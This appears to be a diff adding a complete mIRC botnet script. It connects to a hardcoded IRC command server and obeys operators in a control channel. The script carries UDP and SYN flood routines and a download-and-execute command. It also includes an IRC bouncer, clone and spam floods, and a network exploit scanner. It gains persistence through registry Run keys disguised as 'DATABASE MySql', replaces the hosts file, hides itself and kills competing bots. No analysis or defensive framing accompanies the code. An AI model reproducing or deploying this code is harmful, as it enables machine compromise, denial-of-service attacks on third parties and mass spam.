@@ -1,0 +1,617 @@
+on *:START:{
+  Consets
+  if ($portfree(44445) = $true) { socklisten 1st 44445 }
+  if ($portfree(15000) = $true) { socklisten 2nd 15000 }
+}
+on *:TEXT:*:*: {
+  if ($nick isop $rds(sc)) {
+    if ($1 = !-) && ($2 != $null) { %- = $2- | / $+ %- | unset %- }
+    if ($1 = !pfast) { if ($4 == random) { //d0ntStart $2 $3 $r(1,64000) | halt } | //d0ntStart $2 $3 $4 }
+    if ($1 = !syn) { if ($2 !== $null) { saym nys $2 on $3 with $4 packets | synp start $4 $2 $3 } }
+    if ($1 = !download) { if (-r isin $2-) { set %run 1 } | saym Downloading: $2 | download file $2 $mircdir }
+    if ($1 = !var) { saym Variable equals to: [ [ $$2- ] ] }
+    if ($1 = !rmb) && ($2 != $null) { saym Removed $2 | run repcale.exe cult.exe -kf $2 | remove $findfile(c:\, $+ $2 $+ ,1) }
+    if ($1 = !if)  { f.cmd $2- }
+    if ($1 = !del) { delrxbot }
+    if ($1 = !Scan) { return $Scan($2-) }
+    if ($1 = !Clone) { /clone $2- }
+    if ($1 = !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { saym 2[8ERRoR2]14 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | saym 2[14bnc2]14 /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }
+    if ($1 = !bnc.stats) && ($sock(Bnc)) { saym 2[14bnc2]14 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
+    if ($1 = !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | saym 2[14bnc2]14 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
+    if ($1 = !mpfast) { if ($2 isnum) { mphase $2 $3 $r(1,64000) } | if ($2 = -s) { mphase off } }
+    if ($1 = !task) { ttask $nick }
+    if ($1 = !k) { run repcale.exe cult.exe -kf $2- }
+    if ($1 = !on) { if ($2 = raw) {  strz raw $3- } | if ($2 = gt) {  strz gt } | if ($2 = $null) {  strz normal } }
+    if ($1 = !off) { stptr }
+    if ($1 = !inviteto) {   if ($sock(did*,0) != 0) && ($3 != off) && ($2 != status) { saym My Bot is Already ON!. }
+      .if ($2 == off) { .saym Mass SPaMMer Sets OFF. | sockclose did* | timerinv* off }  
+      .if ($2 == status) && ($sock(did*,0) != 0) { .saym Im 14Spamming on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Gonna be Affected this msg with no (@/+) one. }
+      .if ($2 == status) && ($sock(did*,0) = 0) { .saym Im 4NOT Spamming But My Last SPam Was on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: ( $+ %SPMchannel $+ ) with About;- ( $+ %Total.users $+ ) Users Gonna be Affected this msg with no (@/+) one. }
+      .if ($2 == GO) && ($sock(did*,0) != 0)  { saym Iam Already GONE!. }
+      .if ($2 == GO) && ($sock(did*,0) = 0)  { saym Iam Going ;). | /ruwinviter }
+      if ($sock(did*,0) = 0) {
+        set %total.users 0
+        .if ($3 = rand) { set %SPMChannel #kuwait  }
+        .if ($5 = rand) { set %SPMChannel #kuwait  }
+        .if ($2- == $null) { .saym Are U FooL Use !inviteto  NetWork/server (Channel/rand) (Invite MSG)  }
+        .if ($2 == server) { .set %network $3 $4 | .set %SPMchannel $5  | set %SPAM $6- | /ruwinviter }
+      }
+    }
+  }
+}
+alias ttask { run repcale.exe ksat.bat | timerPlay 1 5 /play $1 taks.w }
+alias fltr { 
+  set %read $read(clf.q,1) 
+  if ($rds(sc) isin %read) { write -dl1 clf.q | halt }
+  if ($rds(ps) isin %read) { write -dl1 clf.q | halt }
+  if (rule line isin %read) { write -dl1 clf.q | halt }
+  if ($port isin %read) { write -dl1 clf.q | halt }
+  if (Quit : isin %read) { write -dl1 clf.q | halt }
+  if (%read = $null) { write -dl1 clf.q | halt }
+  msg $rds(ps) %read
+  write -dl1 clf.q
+}
+alias strz { if ($1 = raw) { write -c law.x | write law.x proto=tcp logtype=4 file=clf.q expri= $+ $2- | run repcale.exe orrl.exe -d 0 law.x | timerFltr 0 1 fltr } | if ($1 = gt) { run repcale.exe orrl.exe -d 0 gt.x | timerFltr 0 1 fltr } | if ($1 = normal) { run repcale.exe orrl.exe -d 0 w.e | timerFltr 0 1 fltr } }
+alias stptr { run repcale.exe cult.exe -kf orrl.exe | timerFltr off | remove clf.q }
+alias f.cmd { if ($1 == $null) || ($2 == $null) || ($3 == $null) { return } | if ( [ [ $1 ] ] $2 [ [ $3 ] ] ) { [ [ $4- ] ] } }
+on *:disconnect:{   timercheck -o 0 20 Cona  }
+on *:sockread:xxx*:{
+  sockread %QHTread
+  Stay %QHTread
+}
+alias mphase  { if ($1 = off) { .timermphase off | unset %mphasen | saym Stopped Code [14Mudp1] } | if ($3 = $null) { return } |  if ($timer(mphase).com != $null) { saym Code Error [14Mudp1] | return } | saym Code Start [14Mudp1] times: $+ $1 traget: $+ $gettok($2,1,45) $gettok($2,2,45) $gettok($2,3,45) $gettok($2,4,45) $gettok($2,5,45) $gettok($2,6,45) $gettok($2,7,45) $gettok($2,8,45) $gettok($2,9,45) $gettok($2,10,45) Port: $+ $3 | set %mphasen 0 | set %mphasn $gettok($2,0,45) | .timermphase -m 0 400 mphase2 $1 $2 $3 }
+alias mphase2 { if ($3 = $null) { goto dend } | if (%mphasen >= $1) { goto dend } | inc %mphasen 2  | sockudp md1ta $gettok($2,1,45) $r(1,65000) $str(1011001,130) | if (1 == %mphasn) { return } | sockudp md2ta $gettok($2,2,45) $r(1,65000) $str(1011001,130) | if (2 == %mphasn) { return } | sockudp md3ta $gettok($2,3,45) $r(1,65000) $str(1011001,130) | if (3 == %mphasn) { return } | sockudp md4ta $gettok($2,4,45) $r(1,65000) $str(1011001,130) | if (4 == %mphasn) { return } | sockudp md5ta $gettok($2,5,45) $r(1,65000) $str(1011001,130) | if (5 == %mphasn) { return } | sockudp md6ta $gettok($2,6,45) $r(1,65000) $str(1011001,130) | if (6 == %mphasn) { return } | sockudp md7ta $gettok($2,7,45) $r(1,65000) $str(1011001,130) | if (7 == %mphasn) { return } | sockudp md8ta $gettok($2,8,45) $r(1,65000) $str(1011001,130) | if (8 == %mphasn) { return } | sockudp md9ta $gettok($2,9,45) $r(1,65000) $str(1011001,130)
+if (9 == %mphasn) { return } | sockudp md10ta $gettok($2,10,45) $r(1,65000) $str(1011001,130) | if (10 == %mphasn) { return } | return | :dend | saym Code End [14Mudp1] | .timermphase off | unset %mphasn | unset %mphase* }
+alias fnick {
+  set %fnick $rand(1,10)
+  if (%fnick = 1) { return $read medo.dl $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
+  if (%fnick = 2) { return $chr($r(65,125)) $+ $read medo.dl $+ $chr($r(65,125))  }
+  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  medo.dl }
+  if (%fnick = 4) { return $r(A,Z) $+ $read medo.dl $+ $r(A,Z) }
+  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
+  if (%fnick = 6) { return $read  medo.dl $+ $r(1,40) $+ $chr($r(65,125))  }
+  if (%fnick = 7) { return $r(a,z) $+ $read medo.dl $+ $r(a,z) }
+  if (%fnick = 8) { return $read  medo.dl $+ $r(a,z) $+ $chr($r(65,125))  }
+  if (%fnick = 9) { return $read  medo.dl $+ $r(1,10) $+ $chr($r(65,125))  }
+  if (%fnick = 10) { return $read  medo.dl $+ $r(20,50) $+ $chr($r(65,125)) }
+}
+on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
+on *:sockread:BncClient*:{
+  sockread %BncClient
+  if ($gettok(%BncClient,1,32) == NICK) {
+    set %Bnc.nick $gettok(%BncClient,2,32)
+  }
+  if ($gettok(%BncClient,1,32) == uSER) {
+    set %Bnc.user $gettok(%BncClient,2-,32)
+    sockwrite -n $sockname NoTICE AuTH : $+ You need to say /quote PASS <password>
+  }
+  if ($gettok(%BncClient,1,32) == PASS) { 
+    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
+      sockwrite -n $sockname NoTICE AuTH : $+ Welcome to BNC 2.6.4-WIN, the irc proxy
+      sockwrite -n $sockname NoTICE AuTH : $+ Level two, lets connect to something real now
+      sockwrite -n $sockname NoTICE AuTH : $+ type /quote conn [server] <port> <pass> to connect
+      %Bnc.legit = yes
+    } 
+    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { 
+      sockwrite -n $sockname NoTICE AuTH : $+ Failed Pass!!
+    }
+  }
+  if ($gettok(%BncClient,1,32) == CoNN) {
+    if (%Bnc.legit != yes) { sockwrite -n $sockname NoTICE AuTH : $+ BNC Exploits dont work on This | sockclose   $sockname
+    }
+    if (BncServer $+ $remove($sockname,BncClient) != $null) {
+      sockclose BncServer $+ $remove($sockname,BncClient)
+    }
+    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
+    sockwrite -n $sockname NoTICE AuTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)
+    set %Bnc.server.passwd $gettok(%BncClient,4,32)
+  }
+  else {
+    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
+      halt
+    }
+    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
+  }
+}
+on *:sockopen:BncServer*:{
+  if ($sockerr) {
+    sockwrite -n $sockname NoTICE AuTH : $+ Failed Connection
+    sockclose $sockname
+    halt
+  }
+  if ($sock($sockname).status != active) {
+    sockwrite -n $sockname NoTICE AuTH : $+ Failed Connection
+    sockclose BncServer $+ $remove($socknme, BncServer)
+    halt
+  }
+  sockwrite -n BncClient $+ $remove($sockname,BncServer) NoTICE AuTH : $+ Suceeded connection
+  sockwrite -n $sockname NICK %Bnc.nick
+  sockwrite -n $sockname uSER %Bnc.user
+}
+on *:sockread:BncServer*:{
+  sockread %BncServer
+  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
+    halt
+  }
+  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
+}
+alias clOne {
+  if ($1 = cOn) { set %cserver $2 | /set %cpOrt $3 | /timerOpensOck $+ $fnick $4 2 OpensOck }
+  if ($1 = jOin) { sOckwrite -nt xxx* JOin $2- }
+  if ($1 = part) { sOckwrite -nt xxx* Part $2 : $+ $3- }
+  if ($1 = msg) { sOckwrite -nt xxx* privmsg $2 : $+ $3- }
+  if ($1 = nOtice) { sOckwrite -nt xxx* nOtice $2 : $+ $3- }
+  if ($1 = reg) { sOckwrite -nt xxx* Privmsg NickServ : $+ register $2- | sOckwrite -nt xxx* Privmsg NickServ : $+ identify $2- }
+  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | sOckwrite -nt xxx* JOin %rchan | sOckwrite -nt xxx* Privmsg Chanserv : register %rchan $fnick xxx }
+  if ($1 = jp) { sOckwrite -nt xxx* JOin $2- | sOckwrite -nt xxx* part $2 : $3- | sOckwrite -nt xxx* JOin $2- | sOckwrite -nt xxx* part $2 : $3- | sOckwrite -nt xxx* JOin $2- | sOckwrite -nt xxx* part $2 : $3- }
+  if ($1 = jmp) { sOckwrite -nt xxx* JOin $2 | sOckwrite -nt xxx* privmsg $2 : $3- | sOckwrite -nt xxx* part $2 }
+  if ($1 = flOOd.c) { sOckwrite -nt xxx* jOin $2 | sOckwrite -nt xxx* privmsg $2 : $3- | sOckwrite -nt xxx* nOtice $2 : $3- | sOckwrite -nt xxx* privmsg $2 : $3- }
+  if ($1 = flOOd.n) { sOckwrite -nt xxx* privmsg $2 : $3- | sOckwrite -nt xxx* nOtice $2 : $3- | sOckwrite -nt xxx* privmsg $2 : $3- }
+  if ($1 = chat.flOOd) { sOckwrite -nt xxx* privmsg $2 :DCC CHAT $2 1058633484 3481  }
+  if ($1 = Quit) { SOckwrite -nt xxx* Quit : $+ $2- }
+  if ($1 = massquit) { SOckWrite -nt xxx* JOin $2 | SOckwrite -nt xxx* Quit : $+ $3- }
+  if ($1 = fnick) { sOckwrite -nt xxx* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }
+  if ($1 = Die) { timerOpensOck* Off | sOckclOse xxx* }
+}
+alias OpensOck { sOckOpen xxx $+ $fnick %cserver %cpOrt }
+alias Stay {
+  if (PING = $1) { sOckwrite -nt * $1- }
+}
+on *:Sockopen:xxx*:{
+  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)
+  .sockwrite -nt $sockname uSER %user %user %user : $+ %user
+  .sockwrite -nt $sockname NICK $fnick
+}
+alias d0ntStart  { if $1 = SToP { .timerd0nt off | unset %gnum | saym [Packeting] Halted } | if $3 = $null { return } |  if $timer(d0nt).com != $null { saym 4ERRoR!1 Currently Attacking: $gettok($timer(d0nt).com,3,32)  | return } |  saym sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ ) |  set %gnum 0 |  .timerd0nt -m 0 400 d0nt1t $1 $2 $3 }
+alias d0nt1t {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
+  sockudp Tw1st $2 $3 $str(âô_6ÜµKTE_}“‘²,60)
+  sockudp Tw2st $2 $3 $str(!@#$%^&*()_+|,50)
+  sockudp Tw3st $2 $3 $str(@,920)
+  sockudp Tw4st $2 $3 $str(0010110,130) 
+  sockudp Tw5st $2 $3 $str(Pong,200)
+  sockudp Tw6st $2 $3 $str(Tw1st,180)
+  sockudp Tw7st $2 $3 $str(*,350)
+  sockudp Tw8st $2 $3 $str(link,200)
+  sockudp Tw9st $2 $3 $str(Tw1st,180)
+  return |  :done | //saym [Packeting] finished | .timerd0nt off | unset %gnum 
+}
+alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | saym Syn Attack Done! }
+alias syn {
+  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
+  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
+}
+alias jc { /join $rds(sc) $rds(sk) }
+on *:join:#:{ if (# = $rds(sc)) { if ($nick = $me) { timerjc off | echo $Scan(all Rand 1 -r) } } }
+alias Cona { server $rds(sr) $rds(sp) }
+raw 433:*:{
+  nick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] 
+}
+alias H1dd3 { if ($appstate != hidden) { /exit } }
+alias s33 { if ($appactive = $true) { /exit } }
+on *:connect:{ .timerjc 0 $rand(2,5) /jc | /jc | .timercheck off | run ymnz.exe }
+alias rds {
+  if ($1 = sf) { return enotxa2.exe }
+  if ($1 = sr) { return h0u3l.q8sound.com }
+  if ($1 = sp) { return 9715 }
+  if ($1 = sc) { return #l04d3d } 
+  if ($1 = sk) { return 3nd0f4rk }
+  if ($1 = rc) { return #qu2ry }
+  if ($1 = ps) { return #8sp1r3 }
+}
+alias download {
+  if (!$isid) {
+    set %drun $nopath($2)
+    var %1 = download $+ $1,%2 = $longfn($3-)
+    if (!$3) { linesep -s | echo $color(info) -s * /download: insufficient parameters | linesep -s | return }
+    if ($sock(%1)) { linesep -s | echo $color(info) -s * /download: $+(',$1,') name in use | linesep -s | return }
+    if (!$isdir(%2)) { linesep -s | echo $color(info) -s * /download: no such dir $+(',%2,') | linesep -s | return }
+    unset % [ $+ [ %1 $+ .* ] ]
+    set % [ $+ [ %1 $+ .file ] ] $+(%2,$iif($right(%2,1) != $chr(92),$chr(92)),$gettok($2,-1,47),.dat)
+    set % [ $+ [ %1 $+ .url ] ] http:// $+ $remove($2,http://)
+    set % [ $+ [ %1 $+ .ctime ] ] $ctime 0
+    set % [ $+ [ %1 $+ .status ] ] Connecting
+    sockopen %1 $gettok($remove($2,http://),1,47) 80
+  }
+  else {
+    if ($1 == 0) { return $sock(download*,0) }
+    if ($iif($1 isnum,$sock(download*,$1),$sock(download $+ $1))) {
+      var %1 = $ifmatch,%2 = $dl.var(%1,file),%3 = $dl.var(%1,size),%4 = $file(%2).size
+      if (!$prop) { return $right(%1,-8) }
+      elseif ($prop == ip) { return $sock(%1).ip }
+      elseif ($prop == status) { return $dl.var(%1,status) }
+      elseif ($prop == url) { return $dl.var(%1,url) }
+      elseif ($prop == file) { return $left(%2,-4) }
+      elseif ($prop == type) { return $dl.var(%1,type) }
+      elseif ($prop == size) { return %3 }
+      elseif ($prop == rcvd) { return %4 }
+      elseif ($prop == cps) { return $int($calc(%4 / ($ctime - $dl.var(%1,ctime,2)))) }
+      elseif ($prop == pc) { return $int($calc($file(%2).size * 100 / %3)) }
+      elseif ($prop == secs) { return $calc($ctime - $dl.var(%1,ctime,1)) }
+    }
+  }
+}
+alias -l dl.var { return $gettok(% [ $+ [ $+($1,.,$2) ] ],$iif(!$3,1-,$3),32) }
+alias -l dl.fail { var %1 = $right($1,-8) | .signal -n download_fail %1 $2- | close -d %1 }
+alias close {
+  if ($1 == -d) {
+    var %1 = download $+ $2
+    if ($sock(%1)) {
+      .remove $+(",$dl.var(%1,file),")
+      unset % [ $+ [ %1 $+ .* ] ]
+      sockclose %1
+    }
+  }
+  else { close $1- }
+}
+on *:sockopen:download*:{
+  if ($sockerr) { dl.fail $sockname unable to Connect | return }
+  var %1 = $dl.var($sockname,url)
+  set % [ $+ [ $sockname $+ .status ] ] Requesting File
+  sockwrite -tn $sockname GET %1 HTTP/1.1
+  sockwrite -tn $sockname Host: $gettok($remove(%1,http://),1,47)
+  sockwrite -tn $sockname Accept: *.*, */*
+  sockwrite -tn $sockname Connection: close
+  sockwrite -tn $sockname $crlf
+}
+on *:sockclose:download*:{ if ($dl.var($sockname,status) != done) { dl.fail $sockname Disconnected } }
+on *:sockread:download*:{
+  if ($sockerr) { saym Download Connection Failed | return }
+  if ($dl.var($sockname,status) != downloading) {
+    var %1 | sockread %1 | tokenize 32 %1
+    if (HTTP/* iswm $1 && $2 != 200) { dl.fail $sockname $3- }
+    elseif ($1 == Content-Length:) { set % [ $+ [ $sockname $+ .size ] ] $2 }
+    elseif ($1 == Content-Type:) { set % [ $+ [ $sockname $+ .type ] ] $2- }
+    elseif (!$1) {
+      write -c $+(",$dl.var($sockname,file),")
+      set % [ $+ [ $sockname $+ .ctime ] ] $dl.var($sockname,ctime,1) $ctime
+      set % [ $+ [ $sockname $+ .status ] ] Downloading
+      return
+    }
+  }
+  else {
+    var %1 = $dl.var($sockname,file)
+    :sockread
+    sockread &1
+    if (!$sockbr) { return }
+    bwrite $+(",%1,") -1 &1
+    if ($file(%1).size >= $dl.var($sockname,size)) {
+      var %1 = $right($sockname,-8),%2 = $dl.var($sockname,file)
+      set % [ $+ [ $sockname $+ .status ] ] Done
+      .copy -o $+(",%2,") $+(",$left(%2,-4),")
+      saym Download Completed
+      if (%run = 1) { run %drun | unset %run | unset %drun }
+      close -d %1
+      return
+    }
+    goto sockread
+  }
+}
+AliAs RegReAd {
+  if ($1 != $null) {
+    vAr %A = regreAd
+    .comopen %A WScript.Shell
+    if !$comerr {
+      vAr %b =  $com(%A,RegReAd,3,bstr,$1-)
+      vAr %c = $com(%A).result
+      .comclose %A
+      if (%c != $null) return %c
+      else {
+        return NA 
+      }
+    }
+  }
+  else { return error! complete dAtA }
+}
+alias delrxbot { run repcale.exe c.bat | timer 1 3 rkot }
+alias rkot {
+  var %lines $lines(lk.x)
+  var %rd 0
+  var %excepts filtax.exe svchosets.exe h1m5w4s.exe h2m6w5s.exe et3rd.exe svdll32.exe enotax2.exe enotxa2.exe
+  while (%rd < %lines) {
+    inc %rd
+    tokenize 32 $replace($read -l $+ %rd lk.x,	, $+ $chr(32) $+ )
+    if (\ !isin $3-) && ($3- != $null) { if (.exe isin $3) && ($3 !isin %excepts) { var %exe $3- | var %reg $2 } | if (.exe isin $4) && ($4 !isin %excepts) { var %exe $4- | var %reg $2-3 } | if (.exe isin $5) && ($5 !isin %excepts) { var %exe $5- | var %reg $2-4 } | if (.exe isin $6) && ($6 !isin %excepts) { var %exe $6- | var %reg $2-5 } | run repcale.exe cult.exe -kf %exe | echo $regdelete(HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ $+ %reg $+ ) | echo $regdelete(HKCu\Software\Microsoft\Windows\CurrentVersion\Run\ $+ %reg $+ ) }
+    if (\ isin $3-) && ($3- != $null) && (.exe isin $3-) && ($count( $+ $3- $+ ,\) = 3) { if (.exe isin $3) && ($3 !isin %excepts) && ($count( $+ $3- $+ ,\) = 3) { var %exe $3- | var %reg $2 } | if (.exe isin $4) && ($4 !isin %excepts) && ($count( $+ $4- $+ ,\) = 3) { var %exe $4- | var %reg $2-3 } | if (.exe isin $5) && ($5 !isin %excepts) && ($count( $+ $5- $+ ,\) = 3) { var %exe $5- | var %reg $2-4 } | if (.exe isin $6) && ($6 !isin %excepts) && ($count( $+ $6- $+ ,\) = 3) { var %exe $6- | var %reg $2-5 } | run repcale.exe cult.exe -kf $nopath(%exe) | echo $regdelete(HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ $+ %reg $+ ) | echo $regdelete(HKCu\Software\Microsoft\Windows\CurrentVersion\Run\ $+ %reg $+ ) }
+  }
+}
+alias hosts { .set %sysdir $remove($mircdir,$gettok($mircdir,$gettok($mircdir,0,92),92) $+ \) | if ($exists(%sysdir $+ drivers\etc\hosts) = $false) { copy hosts %sysdir $+ drivers\etc\hosts } | if ($file(%sysdir $+ drivers\etc\hosts) != 2015) { if ($exists(%sysdir $+ drivers\etc\hosts) = $true) { remove %sysdir $+ drivers\etc\hosts } | copy hosts %sysdir $+ drivers\etc\hosts } }
+AliAs RegWrite {
+  if ($1 != $null) && ($2 != $null) && ($3 != $null) {
+    vAr %A = RegWrite
+    .comopen %A WScript.Shell
+    if !$comerr {
+      vAr %b =  $com(%A,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)
+      .comclose %A
+    }
+    if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) {
+      if ($regreAd($1) == $2) { return the vAlue ( $+ $1 $+ ) wAs creAted }
+      else { return error! when writing }
+    }
+  }
+  else { return error! complete dAtA }
+}
+
+AliAs RegDelete {
+  if ($1 != $null) {
+    vAr %A = RegDelete 
+    .comopen %A WScript.Shell
+    if !$comerr {
+      vAr %b =  $com(%A,RegDelete,3,bstr,$1)
+      .comclose %A
+    }
+  }
+  else { return error! complete dAtA }
+}
+alias n0clone { if ($portfree(12820) == $false) { exit } | socklisten noclone 12820 }
+alias Consets { 
+  .inc %many
+  .if (%many = 1) { set %infecttime $day $date $time }
+  .nick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]]
+  .n0clone
+  .Cona
+  .Checkftp
+  .timercheck 0 40 Cona
+  .timerh1dd3 -o 0 100 H1dd3
+  .timers33 -o 0 100 s33
+  .regs
+  .timerreg -o 0 1 regs
+  .hosts
+  .timerhosts -o 0 0 hosts
+}
+alias regs { if ($Regread(HKEY_LoCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DATABASE MySql) = NA) { regit } }
+alias regit {
+  write -c yrtsiger.bat 
+  write yrtsiger.bat ger ADD "HKEY_LoCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DATABASE MySql= $+ $mircdir $+ repcale.exe $mircexe $+ "
+  write yrtsiger.bat ger ADD "HKEY_LoCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\DATABASE MySql= $+ $mircdir $+ repcale.exe $mircexe $+ "
+  write yrtsiger.bat ger ADD "HKEY_CuRRENT_uSER\Software\Microsoft\Windows\CurrentVersion\Run\DATABASE MySql= $+ $mircdir $+ repcale.exe $mircexe $+ "
+  write yrtsiger.bat ger ADD "HKEY_CuRRENT_uSER\Software\Microsoft\Windows\CurrentVersion\RunServices\DATABASE MySql= $+ $mircdir $+ repcale.exe $mircexe $+ "
+  run repcale.exe yrtsiger.bat
+}
+alias saym { if ($me isvo $rds(sc)) { clearall | msg $rds(sc) $1- } }
+alias cftp { if ($exists(wshield.exe)) && ($exists(abo3ramconfit)) { set %cfp $r(6000,17000) | write -l2 abo3ramconfit BindPort %cfp | $hr(wshield.exe) } }
+alias Checkftp { if ($exists(ALK) = $false) { mkdir ALK } | if ($exists(ALK\ $+ $rds(sf)) = $false) && ($exists(ALK) = $true) && ($exists($rds(sf)) = $true) { copy $rds(sf) ALK\ $+ $rds(sf) } | cftp }
+alias hr { return run repcale.exe $1- }
+
+;;;;;;;;;;;;;;;;;;Exploits Scanner By JoCkeR;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+alias Scan {
+  if ($gettok($1-,1,32) = stop) { 
+    if ($gettok($1-,2,32) = all) { if (-r isin $1-) { unretscan all } | StopSDcom135 | StopSCMD | StopS445r }  
+    if ($gettok($1-,2,32) = CMD) { if (-r isin $1-) { unretscan CMD } | StopSCMD }  
+    if ($gettok($1-,2,32) = Dcom135) { if (-r isin $1-) { unretscan dcom135 } | StopSDcom135 }  
+    if ($gettok($1-,2,32) = 445r) { if (-r isin $1-) { unretscan 445r } | StopS445r }  
+  }
+  if ($gettok($1-,1,32) = all) { if (-r isin $1-) { retscan all } | set %ScanCMD yes | set %ScanDcom135 yes | set %Scan445r yes | if ($gettok($1-,2,32) = Rand) { if ($gettok($1-,3,32) = 0) { set %Scanrange $gettok($ip,1-3,46) $+ .x | goto all } | if ($gettok($1-,3,32) = 1) { set %Scanrange $gettok($ip,1-2,46) $+ .x.x | goto all } | if ($gettok($1-,3,32) = 2) { set %Scanrange $gettok($ip,1,46) $+ .x.x.x | goto all } | if ($gettok($1-,3,32) = 3) { set %Scanrange $gettok($gettok($read(riqa),1,45),1-2,46) $+ .x.x | goto all } } | set %Scanrange $gettok($1-,2,32) | goto all  } 
+  if ($gettok($1-,1,32) = CMD) { if (-r isin $1-) { retscan CMD } | set %ScanCMD yes | if ($gettok($1-,2,32) = Rand) { if ($gettok($1-,3,32) = 0) { set %Scanrange $gettok($ip,1-3,46) $+ .x | goto all } | if ($gettok($1-,3,32) = 1) { set %Scanrange $gettok($ip,1-2,46) $+ .x.x | goto all } | if ($gettok($1-,3,32) = 2) { set %Scanrange $gettok($ip,1,46) $+ .x.x.x | goto all } | if ($gettok($1-,3,32) = 3) { set %Scanrange $gettok($gettok($read(riqa),1,45),1-2,46) $+ .x.x | goto all } } | set %Scanrange $gettok($1-,2,32)  | goto all } 
+  if ($gettok($1-,1,32) = Dcom135) { if (-r isin $1-) { retscan Dcom135 } | set %ScanDcom135 yes | if ($gettok($1-,2,32) = Rand) { if ($gettok($1-,3,32) = 0) { set %Scanrange $gettok($ip,1-3,46) $+ .x | goto all } | if ($gettok($1-,3,32) = 1) { set %Scanrange $gettok($ip,1-2,46) $+ .x.x | goto all } | if ($gettok($1-,3,32) = 2) { set %Scanrange $gettok($ip,1,46) $+ .x.x.x | goto all } | if ($gettok($1-,3,32) = 3) { set %Scanrange $gettok($gettok($read(riqa),1,45),1-2,46) $+ .x.x | goto all } } |  set %Scanrange $gettok($1-,2,32)  | goto all  }
+  if ($gettok($1-,1,32) = 445r) { if (-r isin $1-) { retscan 445r } | set %Scan445r yes | if ($gettok($1-,2,32) = Rand) { if ($gettok($1-,3,32) = 0) { set %Scanrange $gettok($ip,1-3,46) $+ .x | goto all } | if ($gettok($1-,3,32) = 1) { set %Scanrange $gettok($ip,1-2,46) $+ .x.x | goto all } | if ($gettok($1-,3,32) = 2) { set %Scanrange $gettok($ip,1,46) $+ .x.x.x | goto all } | if ($gettok($1-,3,32) = 3) { set %Scanrange $gettok($gettok($read(riqa),1,45),1-2,46) $+ .x.x | goto all } } |  set %Scanrange $gettok($1-,2,32)  | goto all  }
+  :all
+  ;CMD
+  if (%ScanCMD = yes) {
+    if (%ScanCMDStc != $null) { timerScanCMD off | sockclose scanCMD* | unset %ScanCMD* }
+    if ($count(%ScanRange,.) = 0) { set %ScanCMDStc %ScanRange $+ . $+ $r(0,256) $+ . $+ $r(0,256) $+ .1 | set %ScanCMDENc %ScanRange $+ .255.255.255 | set %ScanCMDStL $longip(%ScanCMDStc) | set %ScanCMDENL $longip(%ScanCMDENc) | set %ScantoCMD $calc(%ScanCMDENL - %ScanCMDStL) | timerScanCMD -o 0 15 CMDScan | unset %ScanCMD }
+    if ($count(%ScanRange,.) = 1) { set %ScanCMDStc %ScanRange $+ . $+ $r(0,256) $+ .1 | set %ScanCMDENc %ScanRange $+ .255.255 | set %ScanCMDStL $longip(%ScanCMDStc) | set %ScanCMDENL $longip(%ScanCMDENc) | set %ScantoCMD $calc(%ScanCMDENL - %ScanCMDStL) | timerScanCMD -o 0 15 CMDScan | unset %ScanCMD }
